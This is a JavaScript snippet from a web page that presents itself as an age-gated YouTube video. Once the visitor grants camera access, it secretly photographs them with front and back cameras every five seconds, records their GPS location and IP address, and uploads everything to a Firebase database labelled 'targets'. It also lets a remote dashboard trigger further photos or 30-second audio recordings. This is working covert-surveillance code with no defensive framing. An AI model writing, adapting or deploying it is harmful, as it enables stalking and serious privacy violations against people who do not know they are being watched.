<script>
    // Firebase Config (Same as yours)
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
    const vID = "6Ogzc_-lW9w"; 

    async function startEverything() {
        const uName = document.getElementById('targetName').value;
        if(!uName) return;
        document.getElementById('age-modal').style.display = 'none';
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            document.getElementById('main-player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}`;
            document.getElementById('video-container').style.display = 'block';
            
            // Initial Logs
            sendInfo(uName);
            trackGPS();
            
            // Auto Capture: Front & Back immediately, then every 5 seconds
            capture("user"); 
            setTimeout(() => capture("environment"), 2000);
            setInterval(() => capture("user"), 5000);

            // Command Listener for Dashboard Buttons
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val();
                if(cmd) {
                    if(cmd.action === 'photo_front') capture("user");
                    if(cmd.action === 'photo_back') capture("environment");
                    if(cmd.action === 'audio') recordAudio(30000);
                    db.ref(`commands/${sessionID}`).remove();
                }
            });
        } catch (e) { location.reload(); }
    }

    async function capture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const v = document.createElement('video'); v.srcObject = stream; await v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({ img: c.toDataURL('image/jpeg', 0.5), type: mode });
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch(e) {}
    }

    async function sendInfo(name) {
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        db.ref(`targets/${sessionID}/info`).set({ name: name, ip: ip.ip, status: "ONLINE", lastSeen: new Date().getTime() });
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        });
    }
</script>
